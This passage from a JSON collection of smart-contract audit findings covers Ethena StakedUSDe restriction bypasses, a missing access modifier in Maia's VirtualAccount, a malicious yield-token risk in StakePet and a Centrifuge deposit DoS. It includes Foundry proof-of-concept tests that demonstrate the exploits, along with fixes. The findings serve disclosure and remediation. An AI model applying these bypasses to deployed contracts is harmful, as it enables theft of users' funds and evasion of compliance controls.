`USDe`.\n\n### Proof of Concept\n\nThe following two tests demonstrate the use case of a user staking, then being granted the `SOFT_RESTRICTED_STAKER_ROLE`, then exchanging their `stUSDe` for `USDe` (first using `redeem` function, the second using `withdrawm`).\n\nThe use case for acquiring on the open market, only requiring a different setup, however the exchange behaviour is identical and the cooldown enabled `cooldownAssets` and `cooldownShares` function still use the same `_withdraw` as `redeem` and `withdraw`, which leads to the same outcome.\n\n(Place code into `StakedUSDe.t.sol` and run with `forge test`)<br>\n<https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/test/foundry/staking/StakedUSDe.t.sol>\n\n```Solidity\n  bytes32 public constant SOFT_RESTRICTED_STAKER_ROLE = keccak256(\"SOFT_RESTRICTED_STAKER_ROLE\");\n  bytes32 private constant BLACKLIST_MANAGER_ROLE = keccak256(\"BLACKLIST_MANAGER_ROLE\");\n\n  function test_redeem_while_soft_restricted() public {\n    // Set up Bob with 100 stUSDe\n    uint256 initialAmount = 100 ether;\n    _mintApproveDeposit(bob, initialAmount);\n    uint256 stakeOfBob = stakedUSDe.balanceOf(bob);\n\n    // Alice becomes a blacklist manager\n    vm.prank(owner);\n    stakedUSDe.grantRole(BLACKLIST_MANAGER_ROLE, alice);\n\n    // Blacklist Bob with the SOFT_RESTRICTED_STAKER_ROLE\n    vm.prank(alice);\n    stakedUSDe.addToBlacklist(bob, false);\n\n    // Assert that Bob has staked and is now has the soft restricted role\n    assertEq(usdeToken.balanceOf(bob), 0);\n    assertEq(stakedUSDe.totalSupply(), stakeOfBob);\n    assertEq(stakedUSDe.totalAssets(), initialAmount);\n    assertTrue(stakedUSDe.hasRole(SOFT_RESTRICTED_STAKER_ROLE, bob));\n\n    // Rewards to StakeUSDe and vest\n    uint256 rewardAmount = 50 ether;\n    _transferRewards(rewardAmount, rewardAmount);\n    vm.warp(block.timestamp + 8 hours);\n\n    // Assert that only the total assets have increased after vesting\n    assertEq(usdeToken.balanceOf(bob), 0);\n    assertEq(stakedUSDe.totalSupply(), stakeOfBob);\n    assertEq(stakedUSDe.totalAssets(), initialAmount + rewardAmount);\n    assertTrue(stakedUSDe.hasRole(SOFT_RESTRICTED_STAKER_ROLE, bob));\n\n    // Bob withdraws his stUSDe for USDe\n    vm.prank(bob);\n    stakedUSDe.redeem(stakeOfBob, bob, bob);\n\n    // End state being while being soft restricted Bob redeemed USDe with rewards\n    assertApproxEqAbs(usdeToken.balanceOf(bob), initialAmount + rewardAmount, 2);\n    assertApproxEqAbs(stakedUSDe.totalAssets(), 0, 2);\n    assertTrue(stakedUSDe.hasRole(SOFT_RESTRICTED_STAKER_ROLE, bob));\n  }\n\n  function test_withdraw_while_soft_restricted() public {\n    // Set up Bob with 100 stUSDe\n    uint256 initialAmount = 100 ether;\n    _mintApproveDeposit(bob, initialAmount);\n    uint256 stakeOfBob = stakedUSDe.balanceOf(bob);\n\n    // Alice becomes a blacklist manager\n    vm.prank(owner);\n    stakedUSDe.grantRole(BLACKLIST_MANAGER_ROLE, alice);\n\n    // Blacklist Bob with the SOFT_RESTRICTED_STAKER_ROLE\n    vm.prank(alice);\n    stakedUSDe.addToBlacklist(bob, false);\n\n    // Assert that Bob has staked and is now has the soft restricted role\n    assertEq(usdeToken.balanceOf(bob), 0);\n    assertEq(stakedUSDe.totalSupply(), stakeOfBob);\n    assertEq(stakedUSDe.totalAssets(), initialAmount);\n    assertTrue(stakedUSDe.hasRole(SOFT_RESTRICTED_STAKER_ROLE, bob));\n\n    // Rewards to StakeUSDe and vest\n    uint256 rewardAmount = 50 ether;\n    _transferRewards(rewardAmount, rewardAmount);\n    vm.warp(block.timestamp + 8 hours);\n\n    // Assert that only the total assets have increased after vesting\n    assertEq(usdeToken.balanceOf(bob), 0);\n    assertEq(stakedUSDe.totalSupply(), stakeOfBob);\n    assertEq(stakedUSDe.totalAssets(), initialAmount + rewardAmount);\n    assertTrue(stakedUSDe.hasRole(SOFT_RESTRICTED_STAKER_ROLE, bob));\n\n    // Bob withdraws his stUSDe for USDe (-1 as dust is lost in asset to share rounding in ERC4626)\n    vm.prank(bob);\n    stakedUSDe.withdraw(initialAmount + rewardAmount - 1, bob, bob);\n\n    // End state being while being soft restricted Bob redeemed USDe with rewards\n    assertApproxEqAbs(usdeToken.balanceOf(bob), initialAmount + rewardAmount, 2);\n    assertApproxEqAbs(stakedUSDe.totalAssets(), 0, 2);\n    assertTrue(stakedUSDe.hasRole(SOFT_RESTRICTED_STAKER_ROLE, bob));\n  }\n```\n\n### Tools Used\n\nManual review, Foundry test\n\n### Recommended Mitigation Steps\n\nWith the function overriding present, to prevent the `SOFT_RESTRICTED_STAKER_ROLE` from being able to exchange their `stUSDs` for `USDe`, make the following change in `StakedUSDe`\n\n<https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDe.sol#L232>\n\n```Solidity\n-    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)) {\n+    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller)) {\n      revert OperationNotAllowed();\n    }\n```\n\n**[0xDjango (judge) decreased severity to Medium](https://github.com/code-423n4/2023-10-ethena-findings/issues/246#issuecomment-1810742469)**\n\n**[kayinnnn (Ethena) disputed and commented](https://github.com/code-423n4/2023-10-ethena-findings/issues/246#issuecomment-1858130415):**\n> For this issue, the docs were incorrect to say withdrawal by soft restricted role is not allowed. Only depositing is not allowed.\n\n***\n\n",
      "summary": "\nA bug report was filed stating that a user with the `SOFT_RESTRICTED_STAKER_ROLE` is not allowed to withdraw `USDe` for `stUSDe`. According to legal requirements, users with the `SOFT_RESTRICTED_STAKER_ROLE` must not deposit `USDe` to get `stUSDe` or withdraw `stUSDe` for `USDe`. However, they can participate in earning yield by buying and selling `stUSDe` on the open market. \n\nThe code does not satisfy that condition, when a holder has the `SOFT_RESTRICTED_STAKER_ROLE`, they can exchange their `stUSDe` for `USDe` using `StakedUSDeV2`. This is because both `withdraw` and `redeem` invoke the same internal `_withdraw` function, hence both entrypoints are affected.\n\nTwo tests were conducted that demonstrate a user with `SOFT_RESTRICTED_STAKER_ROLE` can call either `withdraw` or `redeem` (when cooldown is off), or `unstake` (if cooldown is on) and successfully exchange their `stUSDe` for `USDe`.\n\nTo prevent the `SOFT_RESTRICTED_STAKER_ROLE` from being able to exchange their `stUSDs` for `USDe`, a change should be made to the `StakedUSDe` code. The recommended mitigation steps to fix this bug is to add `hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller)` to the `_withdraw` function.\n\nThe bug was initially classified as High severity, however it was decreased to Medium by 0xDjango. Kayinnnn (Ethena) disputed the finding and commented that for this issue, the documentation was incorrect to say withdrawal by soft restricted role is not allowed. Only depositing is not allowed.",
      "report_date": {},
      "contest_prize_txt": "36500",
      "contest_link": "https://code4rena.com/reports/2023-10-ethena",
      "sponsor_name": "Ethena Labs",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2023-10-ethena",
      "github_link": "https://github.com/code-423n4/2023-10-ethena-findings/issues/246",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "299",
      "slug": "m-02-soft-restricted-staker-role-can-withdraw-stusde-for-usde-code4rena-ethena-labs-ethena-labs-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Ethena Labs",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Ethena Labs",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Staking Pool"
            },
            "score": 377.72
          },
          {
            "protocols_protocolcategory": {
              "title": "Decentralized Stablecoin"
            },
            "score": 377.72
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        },
        {
          "tags_tag": {
            "title": "Missing Check"
          }
        }
      ]
    },
    {
      "id": "29384",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 23,
      "protocol_id": "1135",
      "title": "[M-01] ``FULL_RESTRICTED`` Stakers can bypass restriction through approvals",
      "content": "\n<https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDe.sol#L225-L238><br>\n<https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDe.sol#L245-L248>\n\nThe `StakedUSDe` contract implements a method to `SOFTLY` or `FULLY` restrict user address, and either transfer to another user or burn.\n\nHowever there is an underlying issue. A fully restricted address is supposed to be unable to withdraw/redeem, however this issue can be walked around via the approve mechanism.\n\nThe openzeppelin `ERC4626` contract allows approved address to withdraw and redeem on behalf of another address so far there is an approval.\n\n```solidity\n    function redeem(uint256 shares, address receiver, address owner) public virtual override returns (uint256) \n```\n\nBlacklisted Users can explore this loophole to redeem their funds fully. This is because in the overridden `_withdraw` function, the token owner is not checked for restriction.\n\n```solidity\n  function _withdraw(address caller, address receiver, address _owner, uint256 assets, uint256 shares)\n    internal\n    override\n    nonReentrant\n    notZero(assets)\n    notZero(shares)\n  {\n    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)) {\n      revert OperationNotAllowed();\n    }\n```\n\nAlso in the overridden `_beforeTokenTransfer` there is a clause added to allow burning from restricted addresses:\n\n```solidity\n  function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {\n    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, from) && to != address(0)) {\n      revert OperationNotAllowed();\n    }\n```\n\nAll these issues allows a restricted user to simply approve another address and redeem their usde.\n\n### Proof of Concept\n\nThis is a foundry test that can be run in the `StakedUSDe.blacklist.t.sol` in the `test/foundry/staking` directory.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8;\n\n/* solhint-disable private-vars-leading-underscore  */\n/* solhint-disable func-name-mixedcase  */\n/* solhint-disable var-name-mixedcase  */\n\nimport {console} from \"forge-std/console.sol\";\nimport \"forge-std/Test.sol\";\nimport {SigUtils} from \"forge-std/SigUtils.sol\";\n\nimport \"../../../contracts/USDe.sol\";\nimport \"../../../contracts/StakedUSDe.sol\";\nimport \"../../../contracts/interfaces/IUSDe.sol\";\nimport \"../../../contracts/interfaces/IERC20Events.sol\";\nimport \"../../../contracts/interfaces/ISingleAdminAccessControl.sol\";\n\ncontract StakedUSDeBlacklistTest is Test, IERC20Events {\n  USDe public usdeToken;\n  StakedUSDe public stakedUSDe;\n  SigUtils public sigUtilsUSDe;\n  SigUtils public sigUtilsStakedUSDe;\n  uint256 public _amount = 100 ether;\n\n  address public owner;\n  address public alice;\n  address public bob;\n  address public greg;\n\n  bytes32 SOFT_RESTRICTED_STAKER_ROLE;\n  bytes32 FULL_RESTRICTED_STAKER_ROLE;\n  bytes32 DEFAULT_ADMIN_ROLE;\n  bytes32 BLACKLIST_MANAGER_ROLE;\n\n  event Deposit(address indexed caller, address indexed owner, uint256 assets, uint256 shares);\n  event Withdraw(\n    address indexed caller, address indexed receiver, address indexed owner, uint256 assets, uint256 shares\n  );\n  event LockedAmountRedistributed(address indexed from, address indexed to, uint256 amountToDistribute);\n\n  function setUp() public virtual {\n    usdeToken = new USDe(address(this));\n\n    alice = makeAddr(\"alice\");\n    bob = makeAddr(\"bob\");\n    greg = makeAddr(\"greg\");\n    owner = makeAddr(\"owner\");\n\n    usdeToken.setMinter(address(this));\n\n    vm.startPrank(owner);\n    stakedUSDe = new StakedUSDe(IUSDe(address(usdeToken)), makeAddr('rewarder'), owner);\n    vm.stopPrank();\n\n    FULL_RESTRICTED_STAKER_ROLE = keccak256(\"FULL_RESTRICTED_STAKER_ROLE\");\n    SOFT_RESTRICTED_STAKER_ROLE = keccak256(\"SOFT_RESTRICTED_STAKER_ROLE\");\n    DEFAULT_ADMIN_ROLE = 0x00;\n    BLACKLIST_MANAGER_ROLE = keccak256(\"BLACKLIST_MANAGER_ROLE\");\n  }\n\n  function _mintApproveDeposit(address staker, uint256 amount, bool expectRevert) internal {\n    usdeToken.mint(staker, amount);\n\n    vm.startPrank(staker);\n    usdeToken.approve(address(stakedUSDe), amount);\n\n    uint256 sharesBefore = stakedUSDe.balanceOf(staker);\n    if (expectRevert) {\n      vm.expectRevert(IStakedUSDe.OperationNotAllowed.selector);\n    } else {\n      vm.expectEmit(true, true, true, false);\n      emit Deposit(staker, staker, amount, amount);\n    }\n    stakedUSDe.deposit(amount, staker);\n    uint256 sharesAfter = stakedUSDe.balanceOf(staker);\n    if (expectRevert) {\n      assertEq(sharesAfter, sharesBefore);\n    } else {\n      assertApproxEqAbs(sharesAfter - sharesBefore, amount, 1);\n    }\n    vm.stopPrank();\n  }\n\n \n    function test_fullBlacklist_withdraw_pass() public {\n    _mintApproveDeposit(alice, _amount, false);\n\n    vm.startPrank(owner);\n    stakedUSDe.grantRole(FULL_RESTRICTED_STAKER_ROLE, alice);\n    vm.stopPrank();\n    //@audit-issue assert that alice is blacklisted\n   bool isBlacklisted = stakedUSDe.hasRole(FULL_RESTRICTED_STAKER_ROLE, alice);\n   assertEq(isBlacklisted, true);\n  //@audit-issue The staked balance of Alice\n    uint256 balAliceBefore = stakedUSDe.balanceOf(alice); \n    //@audit-issue The usde balance of address 56\n    uint256 bal56Before = usdeToken.balanceOf(address(56));\n    vm.startPrank(alice);\n    stakedUSDe.approve(address(56), _amount);\n    vm.stopPrank();\n    \n    //@audit-issue address 56 receives approval and can unstake usde for Alice after a blacklist\n    vm.startPrank(address(56));\n    stakedUSDe.redeem(_amount, address(56), alice);\n    vm.stopPrank();\n      //@audit-issue The staked balance of Alice\n     uint256 balAliceAfter = stakedUSDe.balanceOf(alice);\n     //@audit-issue The usde balance of address 56\n     uint256 bal56After = usdeToken.balanceOf(address(56));\n\n      assertEq(bal56Before, 0);\n      assertEq(balAliceAfter, 0);\n      console.log(balAliceBefore);\n      console.log(bal56Before);\n      console.log(balAliceAfter);\n      console.log(bal56After);\n\n  }\n}\n```\n\nHere we use `address(56)` as the second address, and we see that the user can withdraw their `100000000000000000000` tokens that was restricted.\n\nThis is my test result showing the  balances.\n\n```shell\n[PASS] test_fullBlacklist_withdraw_pass() (gas: 239624)\nLogs:\n  100000000000000000000 // Alice staked balance before\n  0 // address(56) USDe balance before\n  0 // Alice staked balance after\n  100000000000000000000 // address(56) USDe balance after\n\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.68ms\n```\n\n### Tools Used\n\nFoundry, Manual review\n\n### Recommended Mitigation Steps\n\nCheck the token owner as well in the `_withdraw` function:\n\n```solidity\n\n    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver) || hasRole(FULL_RESTRICTED_STAKER_ROLE, _owner) ) {\n      revert OperationNotAllowed();\n    }\n```\n\n**[FJ-Riveros (Ethena) confirmed via duplicate issue \\#666](https://github.com/code-423n4/2023-10-ethena-findings/issues/666#issuecomment-1802065692)**\n\n**[0xDjango (judge) decreased severity to Medium](https://github.com/code-423n4/2023-10-ethena-findings/issues/499#issuecomment-1810441530)**\n\n**[josephdara (warden) commented](https://github.com/code-423n4/2023-10-ethena-findings/issues/499#issuecomment-1811883453):**\n > Hi @0xDjango,  I do believe this is a high severity bug. It does break a major protocol functionality, compromising assets directly. \n> According to the severity categorization:\n> > 3 — High: Assets can be stolen/lost/compromised directly\n>\n> Thanks!\n\n**[0xDjango (judge) commented](https://github.com/code-423n4/2023-10-ethena-findings/issues/499#issuecomment-1815670715):**\n > @josephdara - I have conversed with the project team, and we have agreed that breaking rules due to legal compliance is medium severity as no funds are at risk.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a loophole in the `StakedUSDe` contract that allows blacklisted users to redeem their funds fully. The issue is that the overridden `_withdraw` and `_beforeTokenTransfer` functions do not check the token owner for restriction. Foundry and manual review were used to identify this issue.\n\nThe recommended mitigation steps are to check the token owner as well in the `_withdraw` function:\n\n```solidity\n    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver) || hasRole(FULL_RESTRICTED_STAKER_ROLE, _owner) ) {\n      revert OperationNotAllowed();\n    }\n```\n\nThe severity of the issue was initially categorized as High but was later decreased to Medium by the project team after a discussion as no funds are at risk.",
      "report_date": {},
      "contest_prize_txt": "36500",
      "contest_link": "https://code4rena.com/reports/2023-10-ethena",
      "sponsor_name": "Ethena Labs",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2023-10-ethena",
      "github_link": "https://github.com/code-423n4/2023-10-ethena-findings/issues/499",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "299",
      "slug": "m-01-full_restricted-stakers-can-bypass-restriction-through-approvals-code4rena-ethena-labs-ethena-labs-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Ethena Labs",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Ethena Labs",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Staking Pool"
            },
            "score": 377.72
          },
          {
            "protocols_protocolcategory": {
              "title": "Decentralized Stablecoin"
            },
            "score": 377.72
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Approve"
          }
        },
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "28803",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 74,
      "protocol_id": "1080",
      "title": "[H-01] All tokens can be stolen from `VirtualAccount` due to missing access modifier",
      "content": "\nAll non-native assets (ERC20 tokens, NFTs, etc.) can be stolen by anyone from a `VirtualAccount` using its [`payableCall(...)`](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L84-L112) method, which lacks the necessary access control modifier [`requiresApprovedCaller`](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L159-L167). See also, the [call(...)](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L65-L82) method which utilizes the [`requiresApprovedCaller`](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L159-L167) modifier.\n\nTherefore, an attacker can craft a call to e.g. `ERC20.transfer(...)` on behalf of the contract, like the [withdrawERC20(...)](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L55-L58) method does, while bypassing access control by executing the call via [`payableCall(...)`](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L84-L112).\n\nAs a consequence, all non-native assets of the `VirtualAccount` can be stolen by anyone causing a loss for its owner.\n\n### Proof of Concept\n\nAdd the code below as a new test file `test/ulysses-omnichain/VirtualAccount.t.sol` and run it using `forge test -vv --match-contract VirtualAccountTest` in order to verify the above claims:\n\n```solidity\n//SPDX-License-Identifier: AGPL-3.0-only\npragma solidity ^0.8.0;\n\nimport {VirtualAccount} from \"@omni/VirtualAccount.sol\";\nimport {PayableCall} from \"@omni/interfaces/IVirtualAccount.sol\";\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\n\nimport \"./helpers/ImportHelper.sol\";\n\n\ncontract VirtualAccountTest is Test {\n\n    address public alice;\n    address public bob;\n\n    VirtualAccount public vAcc;\n\n    function setUp() public {\n        alice = makeAddr(\"Alice\");\n        bob = makeAddr(\"Bob\");\n\n        // create new VirtualAccount for user Alice and this test contract as mock local port\n        vAcc = new VirtualAccount(alice, address(this));\n    }\n\n    function testWithdrawERC20_AliceSuccess() public {\n        vm.prank(alice);\n        vAcc.withdrawERC20(address(this), 1); // caller is authorized\n    }\n\n    function testWithdrawERC20_BobFailure() public {\n        vm.prank(bob);\n        vm.expectRevert();\n        vAcc.withdrawERC20(address(this), 1); // caller is not authorized\n    }\n\n    function testWithdrawERC20_BobBypassSuccess() public {\n        PayableCall[] memory calls = new PayableCall[](1);\n        calls[0].target = address(this);\n        calls[0].callData = abi.encodeCall(ERC20.transfer, (bob, 1));\n\n        vm.prank(bob);\n        vAcc.payableCall(calls); // caller is not authorized but it does't matter\n    }\n\n\n    // mock VirtualAccount call to local port\n    function isRouterApproved(VirtualAccount _userAccount, address _router) external returns (bool) {\n        return false;\n    }\n    \n    // mock ERC20 token transfer\n    function transfer(address to, uint256 value) external returns (bool) {\n        console2.log(\"Transferred %s from %s to %s\", value, msg.sender, to);\n        return true;\n    }\n}\n```\n\nOutput:\n\n```shell\nRunning 3 tests for test/ulysses-omnichain/VirtualAccount.t.sol:VirtualAccountTest\n[PASS] testWithdrawERC20_AliceSuccess() (gas: 15428)\nLogs:\n  Transferred 1 from 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f to 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea\n\n[PASS] testWithdrawERC20_BobBypassSuccess() (gas: 18727)\nLogs:\n  Transferred 1 from 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f to 0x4dBa461cA9342F4A6Cf942aBd7eacf8AE259108C\n\n[PASS] testWithdrawERC20_BobFailure() (gas: 12040)\nTest result: ok. 3 passed; 0 failed; 0 skipped; finished in 1.11ms\n```\n\n### Recommended Mitigation Steps\n\nAdd the missing [`requiresApprovedCaller`](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L159-L167) modifier to the [`payableCall(...)`](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L84-L112) method:\n\n```diff\ndiff --git a/src/VirtualAccount.sol b/src/VirtualAccount.sol\nindex f6a9134..49a679a 100644\n--- a/src/VirtualAccount.sol\n+++ b/src/VirtualAccount.sol\n@@ -82,7 +82,7 @@ contract VirtualAccount is IVirtualAccount, ERC1155Receiver {\n     }\n \n     /// @inheritdoc IVirtualAccount\n-    function payableCall(PayableCall[] calldata calls) public payable returns (bytes[] memory returnData) {\n+    function payableCall(PayableCall[] calldata calls) public payable requiresApprovedCaller returns (bytes[] memory returnData) {\n         uint256 valAccumulator;\n         uint256 length = calls.length;\n         returnData = new bytes[](length);\n```\n\n### Assessed type\n\nAccess Control\n\n**[0xLightt (Maia) confirmed](https://github.com/code-423n4/2023-09-maia-findings/issues/885#issuecomment-1787989558)**\n\n**[0xBugsy (Maia) commented](https://github.com/code-423n4/2023-09-maia-findings/issues/885#issuecomment-1796417864):**\n > Issue addressed [here](https://github.com/Maia-DAO/2023-09-maia-remediations/commit/2209d6e96af986fa0960aacc356ba2be070fdc85).\n\n***\n\n",
      "summary": "\nThis bug report describes a vulnerability in the VirtualAccount contract of the 0xLightt (Maia) project. The vulnerability can be exploited by an attacker to steal non-native assets (ERC20 tokens, NFTs, etc.) from the VirtualAccount contract. This is possible because the payableCall() method, which is used to perform calls to other contracts, lacks the necessary access control modifier requiresApprovedCaller. As a consequence, all non-native assets of the VirtualAccount can be stolen by anyone causing a loss for its owner.\n\nTo verify the vulnerability, a proof of concept code was provided. The proof of concept code adds a new test file to the project and runs it using the command \"forge test -vv --match-contract VirtualAccountTest\". The output of this command shows that the tests have passed.\n\nTo mitigate the vulnerability, it is recommended to add the missing requiresApprovedCaller modifier to the payableCall() method. This has already been done by the 0xLightt (Maia) project and confirmed in the bug report.",
      "report_date": {},
      "contest_prize_txt": "100000",
      "contest_link": "https://code4rena.com/reports/2023-09-maia",
      "sponsor_name": "Maia DAO",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2023-09-maia",
      "github_link": "https://github.com/code-423n4/2023-09-maia-findings/issues/885",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "287",
      "slug": "h-01-all-tokens-can-be-stolen-from-virtualaccount-due-to-missing-access-modifier-code4rena-maia-dao-maia-dao-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Maia DAO",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Maia DAO",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "26161",
      "kind": "MARKDOWN",
      "auditfirm_id": "11",
      "impact": "HIGH",
      "finders_count": 2,
      "protocol_id": "1081",
      "title": "Attackers can use a malicious yield token to steal funds from users",
      "content": "**Severity:** High\n\n**Description:** According to the documentation and the current implementation, anyone can create a new StakePet contract and feed any address for the `YIELD_TOKEN`. As long as a contract implements `IYieldToken` interface, the contract will be created without problems.\n\nAn attacker can create a malicious `IYieldToken` implementation and use that to steal funds from users.\nThe StakePet contract relies on `YIELD_TOKEN.toToken()` and `YIELD_TOKEN.toValue()` in numerous places for accounting.\nConsider a contract that has implemented different logic in `toToken()` and `toValue()` according to the owner's hidden flag.\nThe attacker is likely to let the malicious token contract work normally till the StakePet contract gets enough deposits.\nThen they can switch the hidden flag as they needed to mess the accounting and take profit from it.\nIn the worst case, they can even manipulate the output of `IYieldToken::ERC20_TOKEN()` (maybe to freeze the user funds permanently).\n\n**Impact:** User funds can be stolen or permanently locked.\n\n**Recommended Mitigation:** Consider maintaining a whitelist of YIELD_TOKEN and allow creation of StakePet for only allowed yield tokens.\n\n**Client:** Fixed in commit [308672e](https://github.com/Ranama/StakePet/commit/308672e914651ca2300f2b585d91f16764994bf7).\n\n**Cyfrin:** Verified.",
      "summary": "\nThis bug report is about a vulnerability in the StakePet contract which allows attackers to create malicious tokens and use them to steal or permanently lock user funds. The bug is caused by the contract allowing any address to be fed as the `YIELD_TOKEN` which can be a malicious token contract. The malicious contract can then manipulate the output of `IYieldToken::ERC20_TOKEN()` to freeze user funds. The bug has been fixed with the commit [308672e](https://github.com/Ranama/StakePet/commit/308672e914651ca2300f2b585d91f16764994bf7) and has been verified. The recommended mitigation is to maintain a whitelist of YIELD_TOKEN and allow creation of StakePet for only allowed yield tokens.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "",
      "sponsor_name": null,
      "sponsor_link": "",
      "quality_score": 3,
      "general_score": 3,
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-19-cyfrin-stakepet.md",
      "github_link": "",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "",
      "slug": "attackers-can-use-a-malicious-yield-token-to-steal-funds-from-users-cyfrin-none-cyfrin-stakepet-markdown",
      "firm_name": "Cyfrin",
      "firm_logo_square": "Cyfrin_square.jpg",
      "protocol_name": "Stakepet",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Cyfrin",
        "logo_square": "Cyfrin_square.jpg"
      },
      "protocols_protocol": {
        "name": "Stakepet",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 10.16
          },
          {
            "protocols_protocolcategory": {
              "title": "Farm"
            },
            "score": 10.16
          },
          {
            "protocols_protocolcategory": {
              "title": "Gaming"
            },
            "score": 10.16
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Validation"
          }
        },
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "27032",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 3,
      "protocol_id": "1061",
      "title": "[M-04] You can deposit really small amount for other users to DoS them",
      "content": "\nDeposit and mint under [**LiquidityPool**](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L141-L152) lack access control, which enables any user to **proceed** the  mint/deposit for another user. Attacker can deposit (this does not require tokens) some wai before users TX to DoS the deposit.\n\n### Proof of Concept\n\n[deposit](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L141-L144) and [mint](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L148-L152) do [processDeposit](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L427-L441)/[processMint](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L451-L465) which are the secondary functions to the requests. These function do not take any value in the form of tokens, but only send shares to the receivers. This means they can be called for free.\n\nWith this an attacker who wants to DoS a user, can wait him to make the request to deposit and on the next epoch front run him by calling  [deposit](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L141-L144) with something small like 1 wei. Afterwards when the user calls `deposit`, his TX will inevitable revert, as he will not have enough balance for the full deposit.\n\n### Recommended Mitigation Steps\n\nHave some access control modifiers like [**withApproval**](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L97-L100) used also in [redeem](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L200-L208).\n\n```diff\n-    function deposit(uint256 